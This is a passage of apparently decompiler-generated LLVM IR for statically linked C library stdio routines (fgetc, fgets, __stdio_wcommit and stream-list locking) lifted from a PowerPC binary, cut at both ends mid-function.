  %v0_1000e734 = phi i32 [ %v3_1000e774, %dec_label_pc_1000e760.dec_label_pc_1000e6fc_crit_edge ], [ %v3_1000e6ec, %entry ]
  %v1_1000e6fc = add i32 %v0_1000e734, 64
  %v2_1000e6fc = inttoptr i32 %v1_1000e6fc to i32*
  %v3_1000e6fc = load i32, i32* %v2_1000e6fc, align 4
  %v4_1000e700 = icmp eq i32 %v3_1000e6fc, %v1_1000e700
  br i1 %v4_1000e700, label %dec_label_pc_1000e734, label %dec_label_pc_1000e708

dec_label_pc_1000e708:                            ; preds = %dec_label_pc_1000e6fc
  %v3_1000e70c = icmp eq i32 %v3_1000e6fc, 0
  br i1 %v3_1000e70c, label %dec_label_pc_1000e728, label %dec_label_pc_1000e744

dec_label_pc_1000e728:                            ; preds = %dec_label_pc_1000e708
  %v2_1000e728 = add i32 %v0_1000e734, 60
  %v3_1000e728 = inttoptr i32 %v2_1000e728 to i32*
  store i32 1, i32* %v3_1000e728, align 4
  %v0_1000e72c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000e72c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000e72c = add i32 %v1_1000e72c, 64
  %v3_1000e72c = inttoptr i32 %v2_1000e72c to i32*
  store i32 %v0_1000e72c, i32* %v3_1000e72c, align 4
  br label %dec_label_pc_1000e760

dec_label_pc_1000e734:                            ; preds = %dec_label_pc_1000e6fc
  %v1_1000e734 = add i32 %v0_1000e734, 60
  %v2_1000e734 = inttoptr i32 %v1_1000e734 to i32*
  %v3_1000e734 = load i32, i32* %v2_1000e734, align 4
  %v1_1000e738 = add i32 %v3_1000e734, 1
  store i32 %v1_1000e738, i32* %r9.global-to-local, align 4
  store i32 %v1_1000e738, i32* %v2_1000e734, align 4
  br label %dec_label_pc_1000e760

dec_label_pc_1000e744:                            ; preds = %dec_label_pc_1000e708
  %v1_1000e744 = add i32 %v0_1000e734, 8
  %v2_1000e744 = inttoptr i32 %v1_1000e744 to i32*
  %v3_1000e744 = load i32, i32* %v2_1000e744, align 4
  store i32 %v3_1000e744, i32* %r9.global-to-local, align 4
  %v3_1000e74c = inttoptr i32 %v0_1000e734 to i16*
  store i16 48, i16* %v3_1000e74c, align 2
  %v0_1000e750 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e750 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000e750 = add i32 %v1_1000e750, 20
  %v3_1000e750 = inttoptr i32 %v2_1000e750 to i32*
  store i32 %v0_1000e750, i32* %v3_1000e750, align 4
  %v0_1000e754 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e754 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000e754 = add i32 %v1_1000e754, 24
  %v3_1000e754 = inttoptr i32 %v2_1000e754 to i32*
  store i32 %v0_1000e754, i32* %v3_1000e754, align 4
  %v0_1000e758 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e758 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000e758 = add i32 %v1_1000e758, 28
  %v3_1000e758 = inttoptr i32 %v2_1000e758 to i32*
  store i32 %v0_1000e758, i32* %v3_1000e758, align 4
  %v0_1000e75c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e75c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000e75c = add i32 %v1_1000e75c, 16
  %v3_1000e75c = inttoptr i32 %v2_1000e75c to i32*
  store i32 %v0_1000e75c, i32* %v3_1000e75c, align 4
  br label %dec_label_pc_1000e760

dec_label_pc_1000e760:                            ; preds = %dec_label_pc_1000e734, %dec_label_pc_1000e728, %dec_label_pc_1000e744
  %v0_1000e764 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e764 = add i32 %v0_1000e764, 56
  store i32 %v1_1000e764, i32* %r9.global-to-local, align 4
  %v2_1000e768 = add i32 %v0_1000e764, 52
  %v3_1000e768 = inttoptr i32 %v2_1000e768 to i32*
  store i32 1, i32* %v3_1000e768, align 4
  %v0_1000e774 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e774 = add i32 %v0_1000e774, 32
  %v2_1000e774 = inttoptr i32 %v1_1000e774 to i32*
  %v3_1000e774 = load i32, i32* %v2_1000e774, align 4
  store i32 %v3_1000e774, i32* %r11.global-to-local, align 4
  %v3_1000e780 = icmp eq i32 %v3_1000e774, 0
  %v1_1000e784 = add i32 %v3_1000e774, 56
  store i32 %v1_1000e784, i32* %r9.global-to-local, align 4
  br i1 %v3_1000e780, label %dec_label_pc_1000e780.dec_label_pc_1000e790_crit_edge, label %dec_label_pc_1000e760.dec_label_pc_1000e6fc_crit_edge

dec_label_pc_1000e760.dec_label_pc_1000e6fc_crit_edge: ; preds = %dec_label_pc_1000e760
  %v1_1000e700.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000e6fc

dec_label_pc_1000e780.dec_label_pc_1000e790_crit_edge: ; preds = %dec_label_pc_1000e760
  %storemerge1.pre = load i32, i32* bitcast (i32** @global_var_100211d0.540 to i32*), align 4
  br label %dec_label_pc_1000e790

dec_label_pc_1000e790:                            ; preds = %dec_label_pc_1000e780.dec_label_pc_1000e790_crit_edge, %entry
  %storemerge1 = phi i32 [ %storemerge1.pre, %dec_label_pc_1000e780.dec_label_pc_1000e790_crit_edge ], [ 0, %entry ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_1000e7b44 = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000e7b44, label %dec_label_pc_1000e7bc, label %dec_label_pc_1000e79c

dec_label_pc_1000e79c:                            ; preds = %dec_label_pc_1000e790, %dec_label_pc_1000e7b0
  %v0_1000e7a8 = phi i32 [ %storemerge, %dec_label_pc_1000e7b0 ], [ %storemerge1, %dec_label_pc_1000e790 ]
  %v1_1000e79c = inttoptr i32 %v0_1000e7a8 to i16*
  %v2_1000e79c = load i16, i16* %v1_1000e79c, align 2
  %v3_1000e79c = zext i16 %v2_1000e79c to i32
  %v1_1000e7a0 = and i32 %v3_1000e79c, 64
  store i32 %v1_1000e7a0, i32* %r9.global-to-local, align 4
  %v3_1000e7a0 = icmp eq i32 %v1_1000e7a0, 0
  br i1 %v3_1000e7a0, label %dec_label_pc_1000e7b0, label %dec_label_pc_1000e7a8

dec_label_pc_1000e7a8:                            ; preds = %dec_label_pc_1000e79c
  store i32 %v0_1000e7a8, i32* %r3.global-to-local, align 4
  store i32 268494768, i32* @lr, align 4
  %v3_1000e7ac = call i32 @__stdio_wcommit(i32 %v0_1000e7a8, i32 %v1_1000e7a0)
  store i32 %v3_1000e7ac, i32* %r3.global-to-local, align 4
  %v0_1000e7b0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e7b0

dec_label_pc_1000e7b0:                            ; preds = %dec_label_pc_1000e79c, %dec_label_pc_1000e7a8
  %v0_1000e7b0 = phi i32 [ %v0_1000e7a8, %dec_label_pc_1000e79c ], [ %v0_1000e7b0.pre, %dec_label_pc_1000e7a8 ]
  %v1_1000e7b0 = add i32 %v0_1000e7b0, 32
  %v2_1000e7b0 = inttoptr i32 %v1_1000e7b0 to i32*
  %storemerge = load i32, i32* %v2_1000e7b0, align 4
  store i32 %storemerge, i32* @r31, align 4
  %v3_1000e7b4 = icmp eq i32 %storemerge, 0
  br i1 %v3_1000e7b4, label %dec_label_pc_1000e7bc, label %dec_label_pc_1000e79c

dec_label_pc_1000e7bc:                            ; preds = %dec_label_pc_1000e7b0, %dec_label_pc_1000e790
  store i32 %v0_1000e6f4, i32* @r31, align 4
  %v0_1000e7cc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000e7cc

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000e7a8, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge1, { 0, 2, 1 }
  uselistorder i32 %v3_1000e774, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000e734, { 3, 2, 0, 1, 4 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000e7b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e79c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e760, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e6fc, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000e7d8 = load i32, i32* @r31, align 4
  %v1_1000e7e4 = add i32 %arg1, 8
  %v2_1000e7e4 = inttoptr i32 %v1_1000e7e4 to i32*
  %v3_1000e7e4 = load i32, i32* %v2_1000e7e4, align 4
  store i32 %v3_1000e7e4, i32* @r4, align 4
  %v1_1000e7e8 = add i32 %arg1, 16
  %v2_1000e7e8 = inttoptr i32 %v1_1000e7e8 to i32*
  %v3_1000e7e8 = load i32, i32* %v2_1000e7e8, align 4
  %v2_1000e7ec = sub i32 %v3_1000e7e8, %v3_1000e7e4
  store i32 %v2_1000e7ec, i32* @r5, align 4
  %v5_1000e7ec = icmp eq i32 %v2_1000e7ec, 0
  store i1 %v5_1000e7ec, i1* @cr0_eq, align 1
  br i1 %v5_1000e7ec, label %dec_label_pc_1000e7fc, label %dec_label_pc_1000e7f4

dec_label_pc_1000e7f4:                            ; preds = %entry
  store i32 %v3_1000e7e4, i32* %v2_1000e7e8, align 4
  store i32 268494844, i32* @lr, align 4
  %v2_1000e7f8 = inttoptr i32 %v3_1000e7e4 to i16*
  %v3_1000e7f8 = call i32 @__stdio_WRITE(i16* %v2_1000e7f8, i32 %v2_1000e7ec)
  %v0_1000e7fc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e7fc

dec_label_pc_1000e7fc:                            ; preds = %entry, %dec_label_pc_1000e7f4
  %v0_1000e7fc = phi i32 [ %arg1, %entry ], [ %v0_1000e7fc.pre, %dec_label_pc_1000e7f4 ]
  %v1_1000e7fc = add i32 %v0_1000e7fc, 8
  %v2_1000e7fc = inttoptr i32 %v1_1000e7fc to i32*
  %v3_1000e7fc = load i32, i32* %v2_1000e7fc, align 4
  %v1_1000e800 = add i32 %v0_1000e7fc, 16
  %v2_1000e800 = inttoptr i32 %v1_1000e800 to i32*
  %v3_1000e800 = load i32, i32* %v2_1000e800, align 4
  store i32 %v0_1000e7d8, i32* @r31, align 4
  %v2_1000e808 = sub i32 %v3_1000e800, %v3_1000e7fc
  ret i32 %v2_1000e808

; uselistorder directives
  uselistorder i32 %v0_1000e7fc, { 1, 0 }
  uselistorder i32 %v3_1000e7e4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000e7fc, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000e828 = load i32, i32* @r3, align 4
  store i32 %v0_1000e828, i32* @r31, align 4
  %v1_1000e830 = add i32 %v0_1000e828, 52
  %v2_1000e830 = inttoptr i32 %v1_1000e830 to i32*
  %v3_1000e830 = load i32, i32* %v2_1000e830, align 4
  store i32 %v3_1000e830, i32* @r9, align 4
  %v3_1000e834 = icmp eq i32 %v3_1000e830, 0
  br i1 %v3_1000e834, label %dec_label_pc_1000e870, label %dec_label_pc_1000e83c

dec_label_pc_1000e83c:                            ; preds = %entry
  %v1_1000e83c = add i32 %v0_1000e828, 16
  %v2_1000e83c = inttoptr i32 %v1_1000e83c to i32*
  %v3_1000e83c = load i32, i32* %v2_1000e83c, align 4
  store i32 %v3_1000e83c, i32* @r9, align 4
  %v1_1000e840 = add i32 %v0_1000e828, 24
  %v2_1000e840 = inttoptr i32 %v1_1000e840 to i32*
  %v3_1000e840 = load i32, i32* %v2_1000e840, align 4
  %v2_1000e844 = icmp ult i32 %v3_1000e83c, %v3_1000e840
  br i1 %v2_1000e844, label %dec_label_pc_1000e84c, label %dec_label_pc_1000e85c

dec_label_pc_1000e84c:                            ; preds = %dec_label_pc_1000e83c
  %v1_1000e84c = inttoptr i32 %v3_1000e83c to i8*
  %v2_1000e84c = load i8, i8* %v1_1000e84c, align 1
  %v3_1000e84c = zext i8 %v2_1000e84c to i32
  store i32 %v3_1000e84c, i32* @r30, align 4
  %v1_1000e850 = add i32 %v3_1000e83c, 1
  store i32 %v1_1000e850, i32* %v2_1000e83c, align 4
  br label %dec_label_pc_1000e934

dec_label_pc_1000e85c:                            ; preds = %dec_label_pc_1000e83c
  %v0_1000e86c = call i32 @getc_unlocked()
  br label %dec_label_pc_1000e870

dec_label_pc_1000e870:                            ; preds = %entry, %dec_label_pc_1000e85c
  %v0_1000e880 = phi i32 [ %v0_1000e828, %entry ], [ %v0_1000e86c, %dec_label_pc_1000e85c ]
  %v1_1000e870 = add i32 %v0_1000e880, 64
  %v2_1000e870 = inttoptr i32 %v1_1000e870 to i32*
  %v3_1000e870 = load i32, i32* %v2_1000e870, align 4
  %v0_1000e874 = load i32, i32* @r2, align 4
  %v1_1000e874 = add i32 %v0_1000e874, -29808
  store i32 %v1_1000e874, i32* %r30.global-to-local, align 4
  %v4_1000e878 = icmp eq i32 %v3_1000e870, %v1_1000e874
  br i1 %v4_1000e878, label %dec_label_pc_1000e8b0, label %dec_label_pc_1000e888

dec_label_pc_1000e888:                            ; preds = %dec_label_pc_1000e870
  %v1_1000e880 = add i32 %v0_1000e880, 56
  store i32 %v1_1000e880, i32* @r3, align 4
  %v0_1000e88c = load i32, i32* @r11, align 4
  %v1_1000e88c = load i32, i32* @r9, align 4
  %v4_1000e88c = icmp eq i32 %v0_1000e88c, %v1_1000e88c
  store i1 %v4_1000e88c, i1* @cr0_eq, align 1
  %v3_1000e8a0 = icmp eq i32 %v0_1000e88c, 0
  br i1 %v3_1000e8a0, label %dec_label_pc_1000e8ac, label %dec_label_pc_1000e8a8

dec_label_pc_1000e8a8:                            ; preds = %dec_label_pc_1000e888
  %v0_1000e8a8 = call i32 @__lll_lock_wait_private()
  %v0_1000e8ac.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e8ac

dec_label_pc_1000e8ac:                            ; preds = %dec_label_pc_1000e888, %dec_label_pc_1000e8a8
  %v0_1000e8ac = phi i32 [ %v1_1000e874, %dec_label_pc_1000e888 ], [ %v0_1000e8ac.pre, %dec_label_pc_1000e8a8 ]
  %v1_1000e8ac = load i32, i32* @r31, align 4
  %v2_1000e8ac = add i32 %v1_1000e8ac, 64
  %v3_1000e8ac = inttoptr i32 %v2_1000e8ac to i32*
  store i32 %v0_1000e8ac, i32* %v3_1000e8ac, align 4
  br label %dec_label_pc_1000e8b0

dec_label_pc_1000e8b0:                            ; preds = %dec_label_pc_1000e870, %dec_label_pc_1000e8ac
  %v0_1000e8b0 = load i32, i32* @r31, align 4
  %v1_1000e8b0 = add i32 %v0_1000e8b0, 16
  %v2_1000e8b0 = inttoptr i32 %v1_1000e8b0 to i32*
  %v3_1000e8b0 = load i32, i32* %v2_1000e8b0, align 4
  store i32 %v3_1000e8b0, i32* @r11, align 4
  %v1_1000e8b4 = add i32 %v0_1000e8b0, 24
  %v2_1000e8b4 = inttoptr i32 %v1_1000e8b4 to i32*
  %v3_1000e8b4 = load i32, i32* %v2_1000e8b4, align 4
  %v1_1000e8b8 = add i32 %v0_1000e8b0, 60
  %v2_1000e8b8 = inttoptr i32 %v1_1000e8b8 to i32*
  %v3_1000e8b8 = load i32, i32* %v2_1000e8b8, align 4
  %v2_1000e8bc = icmp ult i32 %v3_1000e8b0, %v3_1000e8b4
  %v1_1000e8c0 = add i32 %v3_1000e8b8, 1
  store i32 %v1_1000e8c0, i32* %v2_1000e8b8, align 4
  br i1 %v2_1000e8bc, label %dec_label_pc_1000e8cc, label %dec_label_pc_1000e8dc

dec_label_pc_1000e8cc:                            ; preds = %dec_label_pc_1000e8b0
  %v0_1000e8cc = load i32, i32* @r11, align 4
  %v1_1000e8cc = inttoptr i32 %v0_1000e8cc to i8*
  %v2_1000e8cc = load i8, i8* %v1_1000e8cc, align 1
  %v3_1000e8cc = zext i8 %v2_1000e8cc to i32
  store i32 %v3_1000e8cc, i32* @r30, align 4
  %v1_1000e8d0 = add i32 %v0_1000e8cc, 1
  store i32 %v1_1000e8d0, i32* @r0, align 4
  %v1_1000e8d4 = load i32, i32* @r31, align 4
  %v2_1000e8d4 = add i32 %v1_1000e8d4, 16
  %v3_1000e8d4 = inttoptr i32 %v2_1000e8d4 to i32*
  store i32 %v1_1000e8d0, i32* %v3_1000e8d4, align 4
  br label %dec_label_pc_1000e8e8

dec_label_pc_1000e8dc:                            ; preds = %dec_label_pc_1000e8b0
  %v0_1000e8dc = load i32, i32* @r31, align 4
  store i32 %v0_1000e8dc, i32* @r3, align 4
  store i32 268495076, i32* @lr, align 4
  %v0_1000e8e0 = call i32 @getc_unlocked()
  store i32 %v0_1000e8e0, i32* @r30, align 4
  br label %dec_label_pc_1000e8e8

dec_label_pc_1000e8e8:                            ; preds = %dec_label_pc_1000e8cc, %dec_label_pc_1000e8dc
  %v0_1000e8e8 = load i32, i32* @r31, align 4
  %v1_1000e8e8 = add i32 %v0_1000e8e8, 60
  %v2_1000e8e8 = inttoptr i32 %v1_1000e8e8 to i32*
  %v3_1000e8e8 = load i32, i32* %v2_1000e8e8, align 4
  %v1_1000e8ec = add i32 %v3_1000e8e8, -1
  store i32 %v1_1000e8ec, i32* @r9, align 4
  %v3_1000e8f0 = icmp eq i32 %v1_1000e8ec, 0
  store i32 %v1_1000e8ec, i32* %v2_1000e8e8, align 4
  br i1 %v3_1000e8f0, label %dec_label_pc_1000e8fc, label %dec_label_pc_1000e934

dec_label_pc_1000e8fc:                            ; preds = %dec_label_pc_1000e8e8
  %v0_1000e8fc = load i32, i32* @r9, align 4
  %v1_1000e8fc = load i32, i32* @r31, align 4
  %v2_1000e8fc = add i32 %v1_1000e8fc, 64
  %v3_1000e8fc = inttoptr i32 %v2_1000e8fc to i32*
  store i32 %v0_1000e8fc, i32* %v3_1000e8fc, align 4
  %v0_1000e910.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000e908

dec_label_pc_1000e908:                            ; preds = %dec_label_pc_1000e908, %dec_label_pc_1000e8fc
  %v0_1000e910 = phi i1 [ false, %dec_label_pc_1000e908 ], [ %v0_1000e910.pr, %dec_label_pc_1000e8fc ]
  br i1 %v0_1000e910, label %dec_label_pc_1000e914, label %dec_label_pc_1000e908

dec_label_pc_1000e914:                            ; preds = %dec_label_pc_1000e908
  %v0_1000e914 = load i32, i32* @r0, align 4
  %tmp6 = icmp slt i32 %v0_1000e914, 2
  br i1 %tmp6, label %dec_label_pc_1000e934, label %dec_label_pc_1000e91c

dec_label_pc_1000e91c:                            ; preds = %dec_label_pc_1000e914
  store i32 129, i32* @r4, align 4
  %v0_1000e930 = call i32 @__asm_mfcr()
  br label %dec_label_pc_1000e934

dec_label_pc_1000e934:                            ; preds = %dec_label_pc_1000e8e8, %dec_label_pc_1000e914, %dec_label_pc_1000e84c, %dec_label_pc_1000e91c
  %v0_1000e938 = load i32, i32* @r30, align 4
  ret i32 %v0_1000e938

; uselistorder directives
  uselistorder i32 %v3_1000e83c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000e828, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000e934, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e8e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000e870, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r31, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  %v1_1000e968 = add i32 %arg3, 52
  %v2_1000e968 = inttoptr i32 %v1_1000e968 to i32*
  %v3_1000e968 = load i32, i32* %v2_1000e968, align 4
  %v3_1000e96c = icmp eq i32 %v3_1000e968, 0
  br i1 %v3_1000e96c, label %dec_label_pc_1000e974, label %dec_label_pc_1000e9c0

dec_label_pc_1000e974:                            ; preds = %entry
  %v1_1000e974 = add i32 %arg3, 64
  %v2_1000e974 = inttoptr i32 %v1_1000e974 to i32*
  %v3_1000e974 = load i32, i32* %v2_1000e974, align 4
  %v0_1000e978 = load i32, i32* @r2, align 4
  %v1_1000e978 = add i32 %v0_1000e978, -29808
  store i32 %v1_1000e978, i32* %r29.global-to-local, align 4
  %v4_1000e97c = icmp eq i32 %v3_1000e974, %v1_1000e978
  br i1 %v4_1000e97c, label %dec_label_pc_1000e9b4, label %dec_label_pc_1000e98c

dec_label_pc_1000e98c:                            ; preds = %dec_label_pc_1000e974
  %v1_1000e984 = add i32 %arg3, 56
  store i32 %v1_1000e984, i32* @r3, align 4
  %v0_1000e990 = load i32, i32* @r9, align 4
  %v4_1000e990 = icmp eq i32 %v0_1000e990, 0
  store i1 %v4_1000e990, i1* @cr0_eq, align 1
  br i1 %v4_1000e990, label %dec_label_pc_1000e9b0, label %dec_label_pc_1000e9ac

dec_label_pc_1000e9ac:                            ; preds = %dec_label_pc_1000e98c
  %v0_1000e9ac = call i32 @__lll_lock_wait_private()
  %v0_1000e9b0.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_1000e9b0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e9b0

dec_label_pc_1000e9b0:                            ; preds = %dec_label_pc_1000e98c, %dec_label_pc_1000e9ac
  %v1_1000e9b0 = phi i32 [ %arg3, %dec_label_pc_1000e98c ], [ %v1_1000e9b0.pre, %dec_label_pc_1000e9ac ]
  %v0_1000e9b0 = phi i32 [ %v1_1000e978, %dec_label_pc_1000e98c ], [ %v0_1000e9b0.pre, %dec_label_pc_1000e9ac ]
  %v2_1000e9b0 = add i32 %v1_1000e9b0, 64
  %v3_1000e9b0 = inttoptr i32 %v2_1000e9b0 to i32*
  store i32 %v0_1000e9b0, i32* %v3_1000e9b0, align 4
  %v0_1000e9b4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e9b4

dec_label_pc_1000e9b4:                            ; preds = %dec_label_pc_1000e974, %dec_label_pc_1000e9b0
  %v0_1000e9b4 = phi i32 [ %arg3, %dec_label_pc_1000e974 ], [ %v0_1000e9b4.pre, %dec_label_pc_1000e9b0 ]
  %v1_1000e9b4 = add i32 %v0_1000e9b4, 60
  %v2_1000e9b4 = inttoptr i32 %v1_1000e9b4 to i32*
  %v3_1000e9b4 = load i32, i32* %v2_1000e9b4, align 4
  %v1_1000e9b8 = add i32 %v3_1000e9b4, 1
  store i32 %v1_1000e9b8, i32* @r9, align 4
  store i32 %v1_1000e9b8, i32* %v2_1000e9b4, align 4
  %v0_1000e9c0.pre = load i32, i32* @r27, align 4
  %v0_1000e9c4.pre = load i32, i32* %r28.global-to-local, align 4
  %v0_1000e9c8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e9c0

dec_label_pc_1000e9c0:                            ; preds = %entry, %dec_label_pc_1000e9b4
  %v0_1000e9c8 = phi i32 [ %arg3, %entry ], [ %v0_1000e9c8.pre, %dec_label_pc_1000e9b4 ]
  %v0_1000e9c4 = phi i32 [ %arg2, %entry ], [ %v0_1000e9c4.pre, %dec_label_pc_1000e9b4 ]
  %v0_1000e9c0 = phi i32 [ %arg1, %entry ], [ %v0_1000e9c0.pre, %dec_label_pc_1000e9b4 ]
  store i32 268495312, i32* @lr, align 4
  %v3_1000e9cc = inttoptr i32 %v0_1000e9c0 to i8*
  %v4_1000e9cc = call i32 @__GI_fgets_unlocked(i8* %v3_1000e9cc, i32 %v0_1000e9c4, i32 %v0_1000e9c8)
  %v0_1000e9d0 = load i32, i32* @r30, align 4
  %v3_1000e9d0 = icmp eq i32 %v0_1000e9d0, 0
  store i32 %v4_1000e9cc, i32* @r29, align 4
  br i1 %v3_1000e9d0, label %dec_label_pc_1000e9dc, label %dec_label_pc_1000ea28

dec_label_pc_1000e9dc:                            ; preds = %dec_label_pc_1000e9c0
  %v0_1000e9dc = load i32, i32* @r31, align 4
  %v1_1000e9dc = add i32 %v0_1000e9dc, 60
  %v2_1000e9dc = inttoptr i32 %v1_1000e9dc to i32*
  %v3_1000e9dc = load i32, i32* %v2_1000e9dc, align 4
  %v1_1000e9e0 = add i32 %v3_1000e9dc, -1
  store i32 %v1_1000e9e0, i32* @r9, align 4
  %v3_1000e9e4 = icmp eq i32 %v1_1000e9e0, 0
  store i32 %v1_1000e9e0, i32* %v2_1000e9dc, align 4
  br i1 %v3_1000e9e4, label %dec_label_pc_1000e9f0, label %dec_label_pc_1000ea28

dec_label_pc_1000e9f0:                            ; preds = %dec_label_pc_1000e9dc
  %v0_1000e9f0 = load i32, i32* @r9, align 4
  %v1_1000e9f0 = load i32, i32* @r31, align 4
  %v2_1000e9f0 = add i32 %v1_1000e9f0, 64
  %v3_1000e9f0 = inttoptr i32 %v2_1000e9f0 to i32*
  store i32 %v0_1000e9f0, i32* %v3_1000e9f0, align 4
  %v0_1000ea04.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000e9fc

dec_label_pc_1000e9fc:                            ; preds = %dec_label_pc_1000e9fc, %dec_label_pc_1000e9f0
  %v0_1000ea04 = phi i1 [ false, %dec_label_pc_1000e9fc ], [ %v0_1000ea04.pr, %dec_label_pc_1000e9f0 ]
  br i1 %v0_1000ea04, label %dec_label_pc_1000ea08, label %dec_label_pc_1000e9fc

dec_label_pc_1000ea08:                            ; preds = %dec_label_pc_1000e9fc
  %v0_1000ea08 = load i32, i32* @r0, align 4
  %tmp9 = icmp slt i32 %v0_1000ea08, 2
  br i1 %tmp9, label %dec_label_pc_1000ea28, label %dec_label_pc_1000ea10

dec_label_pc_1000ea10:                            ; preds = %dec_label_pc_1000ea08
  %v0_1000ea24 = call i32 @__asm_mfcr()
  br label %dec_label_pc_1000ea28

dec_label_pc_1000ea28:                            ; preds = %dec_label_pc_1000e9dc, %dec_label_pc_1000e9c0, %dec_label_pc_1000ea08, %dec_label_pc_1000ea10
  %v0_1000ea2c = load i32, i32* @r29, align 4
  ret i32 %v0_1000ea2c

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder label %dec_label_pc_1000ea28, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e9c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e9b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e9b0, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100212dc.562 to i32), i32* @r31, align 4
  %v0_1000ea58 = load i32, i32* @r2, align 4
  %v1_1000ea58 = add i32 %v0_1000ea58, -29808
  store i32 %v1_1000ea58, i32* @r30, align 4
  %v3_1000ea5c = load i32, i32* @global_var_100212e4.563, align 4
  %v4_1000ea60 = icmp eq i32 %v3_1000ea5c, %v1_1000ea58
  br i1 %v4_1000ea60, label %dec_label_pc_1000ea9c, label %dec_label_pc_1000ea70

dec_label_pc_1000ea70:                            ; preds = %entry
  store i32 0, i32* @r9, align 4
  %v0_1000ea74 = load i32, i32* @r11, align 4
  %v4_1000ea74 = icmp eq i32 %v0_1000ea74, 0
  store i1 %v4_1000ea74, i1* @cr0_eq, align 1
  br i1 %v4_1000ea74, label %dec_label_pc_1000ea98, label %dec_label_pc_1000ea90

dec_label_pc_1000ea90:                            ; preds = %dec_label_pc_1000ea70
  store i32 ptrtoint (i32* @global_var_100212dc.562 to i32), i32* @r3, align 4
  %v0_1000ea94 = call i32 @__lll_lock_wait_private()
  %v0_1000ea98.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000ea98

dec_label_pc_1000ea98:                            ; preds = %dec_label_pc_1000ea70, %dec_label_pc_1000ea90
  %v0_1000ea98 = phi i32 [ %v1_1000ea58, %dec_label_pc_1000ea70 ], [ %v0_1000ea98.pre, %dec_label_pc_1000ea90 ]
  store i32 %v0_1000ea98, i32* @global_var_100212e4.563, align 4
  br label %dec_label_pc_1000ea9c

dec_label_pc_1000ea9c:                            ; preds = %entry, %dec_label_pc_1000ea98
  %v3_1000eaa4 = load i32, i32* @global_var_10021244.564, align 4
  %v3_1000eaac = load i32, i32* @global_var_100212e0.565, align 4
  %v3_1000eab0 = icmp eq i32 %v3_1000eaa4, 1
  %v1_1000eab4 = add i32 %v3_1000eaac, 1
  store i32 %v1_1000eab4, i32* @global_var_100212e0.565, align 4
  br i1 %v3_1000eab0, label %dec_label_pc_1000eac0, label %dec_label_pc_1000ebe8

dec_label_pc_1000eac0:                            ; preds = %dec_label_pc_1000ea9c
  %v3_1000eac4 = load i32, i32* @global_var_10021248.566, align 4
  %tmp14 = icmp slt i32 %v3_1000eac4, 1
  br i1 %tmp14, label %dec_label_pc_1000ebe8, label %dec_label_pc_1000ead0

dec_label_pc_1000ead0:                            ; preds = %dec_label_pc_1000eac0
  store i32 268566528, i32* @r9, align 4
  %v0_1000ead4 = load i32, i32* @r2, align 4
  %v1_1000ead4 = add i32 %v0_1000ead4, -29808
  store i32 %v1_1000ead4, i32* %r30.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100212d0.536 to i32), i32* @r31, align 4
  %v3_1000eadc = load i32, i32* @global_var_100212d8.537, align 4
  store i32 %v3_1000eadc, i32* @r0, align 4
  %v4_1000eae0 = icmp eq i32 %v3_1000eadc, %v1_1000ead4
